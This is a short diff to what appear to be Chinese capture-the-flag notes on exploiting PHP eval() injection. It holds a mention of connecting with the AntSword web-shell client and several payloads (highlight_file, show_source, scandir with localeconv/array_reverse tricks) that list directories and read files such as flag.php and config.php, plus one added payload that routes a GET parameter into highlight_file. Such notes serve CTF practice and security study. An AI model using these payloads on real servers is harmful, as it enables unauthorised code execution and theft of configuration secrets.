@@ -7,6 +7,8 @@
 如果是eval($_POST('c'))，直接蚁剑连，用插件绕过
 ```
 c=highlight_file("config.php");        //文件内容包含高亮。
+c=highlight_file($_GET[1])&1=flag.php
+
 c=show_source('flag.php');
 c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 c=print_r(scandir(dirname('__FILE__')));
